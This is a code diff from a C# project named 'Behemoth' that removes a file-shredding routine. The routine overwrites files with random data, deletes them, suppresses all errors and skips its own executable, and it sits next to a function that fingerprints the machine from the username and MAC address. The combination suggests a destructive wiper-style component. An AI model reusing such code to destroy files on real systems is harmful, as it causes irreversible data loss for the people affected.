@@ -183,48 +183,6 @@ namespace Behemoth
 
 
         /// <summary>
-        /// File shredder for shredding & deleting a file. There is an if statement to skip deleting the current file.
-        /// </summary>
-        /// <param name="filePath"></param>
-        public static void Shredder(string filePath)
-        {
-            const int BufferSize = 8192;
-            const int Passes = 3;
-
-            try
-            {
-                string currentExecutablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-
-                if (string.Equals(filePath, currentExecutablePath, StringComparison.OrdinalIgnoreCase))
-                {
-                    return;
-                }
-
-                using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
-                {
-                    byte[] buffer = new byte[BufferSize];
-                    RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
-
-                    for (int pass = 0; pass < Passes; pass++)
-                    {
-                        for (long i = 0; i < fileStream.Length; i += BufferSize)
-                        {
-                            rng.GetBytes(buffer);
-                            fileStream.Write(buffer, 0, BufferSize);
-                        }
-
-                        fileStream.Flush();
-                        fileStream.SetLength(0);
-                        fileStream.Seek(0, SeekOrigin.Begin);
-                    }
-                }
-                System.IO.File.Delete(filePath);
-            }
-            catch { }
-        }
-
-
-        /// <summary>
         /// This function generates a UID for the machine, the UID is created by combining username & mac address.
         /// </summary>
         /// <returns></returns>
